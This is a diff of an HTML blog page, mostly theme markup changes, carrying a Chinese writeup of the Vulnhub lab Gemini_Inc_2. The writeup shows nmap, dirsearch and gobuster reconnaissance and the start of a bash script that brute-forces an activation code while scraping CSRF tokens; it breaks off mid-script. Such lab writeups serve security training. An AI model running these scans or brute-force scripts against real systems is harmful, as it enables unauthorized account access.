@@ -1,23 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang=zh>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="20 Vulnhub Gemini_Inc_2 Writeup">
 <meta property="og:url" content="https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/index.html">
@@ -61,280 +50,158 @@
 <meta property="article:tag" content="redis漏洞">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211550.png">
-
-
-<link rel="canonical" href="https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/","path":"2022/05/03/20 Vulnhub Gemini_Inc_2 Writeup/","title":"20 Vulnhub Gemini_Inc_2 Writeup"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>20 Vulnhub Gemini_Inc_2 Writeup | HDFZZF's BLOG</title>
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
-
-  <main class="main">
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">HDFZZF's BLOG</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
-        
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">2. 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.2. 访问http服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-text">2.2.1. 方法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-text">2.2.2. 方法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-text">2.3. get shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%95%AA%E5%A4%96"><span class="nav-text">2.3.1. 番外</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">2.4. 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">3. 总结</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="hdfzzf"
-      src="/images/zzf.jpg">
-  <p class="site-author-name" itemprop="name">hdfzzf</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">121</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">13</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">194</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author site-overview-item animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-        </div>
-      </div>
-    </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
-
-    </header>
-
     
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-  <div class="reading-progress-bar"></div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/zzf.jpg">
-      <meta itemprop="name" content="hdfzzf">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="HDFZZF's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          20 Vulnhub Gemini_Inc_2 Writeup
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
+    
       
-
-      <time title="创建时间：2022-05-03 00:00 / 修改时间：23:07" itemprop="dateCreated datePublished" datetime="2022-05-03T00:00:00+08:00">2022-05-03</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-  
-  <span class="post-meta-item">
+        
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
     
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus：</span>
+    <!-- title -->
+    <title>20 Vulnhub Gemini_Inc_2 Writeup</title>
+    <!-- styles -->
     
-    <a title="disqus" href="/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/05/03/20 Vulnhub Gemini_Inc_2 Writeup/" itemprop="commentCount"></span>
-    </a>
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/05/03/Linux(kali)%E5%AE%89%E8%A3%85clash/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&text=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&is_video=false&description=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=20 Vulnhub Gemini_Inc_2 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&title=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&name=20 Vulnhub Gemini_Inc_2 Writeup&description=&lt;p&gt;该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/&t=20 Vulnhub Gemini_Inc_2 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 番外</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
   </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>5.8k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>5 分钟</span>
-    </span>
 </div>
 
-        </div>
-      </header>
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        20 Vulnhub Gemini_Inc_2 Writeup
+    </h1>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <p>该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。</p>
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-02T16:00:00.000Z" itemprop="datePublished">2022-05-03</time>
+        
+        (Updated: <time datetime="2022-05-03T15:07:26.999Z" itemprop="dateModified">2022-05-03</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Anto-CSRF-token/" rel="tag">Anto CSRF token</a>, <a class="tag-link-link" href="/tags/WAF-Bypass/" rel="tag">WAF Bypass</a>, <a class="tag-link-link" href="/tags/redis%E6%BC%8F%E6%B4%9E/" rel="tag">redis漏洞</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>, <a class="tag-link-link" href="/tags/%E9%9A%90%E8%97%8F%E8%B7%AF%E5%BE%84%E7%88%AC%E5%8F%96/" rel="tag">隐藏路径爬取</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。</p>
 <span id="more"></span>
 <h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
@@ -367,14 +234,17 @@
 </ul>
 <h1 id="渗透">2. 渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.21</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.21</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
+<span class="token function">sudo</span> nmap -p- <span class="token number">192.168</span>.100.21
+<span class="token function">sudo</span> nmap -p22,80 -A <span class="token number">192.168</span>.100.21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211550.png" /></p>
 <p>可以得到的信息很常规。</p>
 <h2 id="访问http服务">2.2. 访问http服务</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211635.png" /></p>
 <p>与1不同的是，这里多了一个登录功能，尝试1的账号和密码，发现无法登录。除了这个之外，User List点进去是空白的页面，然后就没有其他的了。</p>
-<p>接下来路径发现： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.21/</span><br></pre></td></tr></table></figure></p>
-<p>然后对扫描到的路径一一检查，并没有发现有用的信息。（默默bb一句：dirsearch每次都扫不出关键的，因此强烈建议配合dirb和gobuster使用）隐藏路径爬取：（二选一） <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. dirb http://192.168.100.21 -X .php</span><br><span class="line">2. gobuster dir -u http://192.168.100.21/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt</span><br></pre></td></tr></table></figure></p>
+<p>接下来路径发现： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://192.168.100.21/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后对扫描到的路径一一检查，并没有发现有用的信息。（默默bb一句：dirsearch每次都扫不出关键的，因此强烈建议配合dirb和gobuster使用）隐藏路径爬取：（二选一） <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. dirb http://192.168.100.21 -X .php
+<span class="token number">2</span>. gobuster <span class="token function">dir</span> -u http://192.168.100.21/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212047.png" /></p>
 <p>得到两个新的文件。前者目前还看不懂什么作用，不过从名字来看应该是激活用户的。而后者就是注册新用户的，因此先注册一个用户</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212349.png" /></p>
@@ -386,8 +256,19 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212732.png" /></p>
 <p>会发现这里提交的token和源码中隐藏的token是一样的，并且多尝试提交几次，每次都是如此。合理怀疑这是CSRF token。这是需要注意的一个点。</p>
 <h3 id="方法1">2.2.1. 方法1</h3>
-<p>在网上找到别人写的一个脚本： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">url=<span class="string">&quot;http://192.168.100.21/activate.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> &#123;000000..999999&#125;; <span class="keyword">do</span></span><br><span class="line">    token=$(curl -s -c cookie <span class="variable">$url</span> | awk -F <span class="string">&#x27;value=&#x27;</span> <span class="string">&#x27;/token/ &#123;print $2&#125;&#x27;</span> | cut -d <span class="string">&quot;&#x27;&quot;</span> -f2)</span><br><span class="line">    resp=$(curl -s -w %&#123;http_code&#125; -b cookie --data <span class="string">&quot;userid=14&amp;activation_code=<span class="variable">$key</span>&amp;token=<span class="variable">$&#123;token&#125;</span>&quot;</span> <span class="variable">$url</span> | tail -n 1 | cut -d <span class="string">&quot;&gt;&quot;</span> -f2)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$resp</span> -ne 403 ]; <span class="keyword">then</span></span><br><span class="line">        <span 